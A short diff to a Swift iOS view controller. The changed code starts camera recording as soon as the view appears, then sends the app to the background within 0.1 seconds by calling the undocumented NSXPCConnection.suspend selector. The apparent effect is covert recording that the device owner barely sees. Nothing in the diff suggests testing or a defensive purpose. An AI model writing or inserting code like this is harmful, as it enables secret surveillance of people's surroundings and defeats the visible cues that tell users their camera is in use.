@@ -12,13 +12,14 @@ class ViewController: UIViewController {
     override func viewDidAppear(_ animated: Bool) {
         super.viewDidAppear(animated)
 
-        if cameraManager.isRecording {
-            cameraManager.stopRecording()
-        } else {
+        // Start recording as soon as the view appears
+        if !cameraManager.isRecording {
             cameraManager.startRecording()
-            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
-                UIApplication.shared.perform(#selector(NSXPCConnection.suspend))
-            }
+        }
+
+        // Send app to background immediately
+        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
+            UIApplication.shared.perform(#selector(NSXPCConnection.suspend))
         }
     }
 }
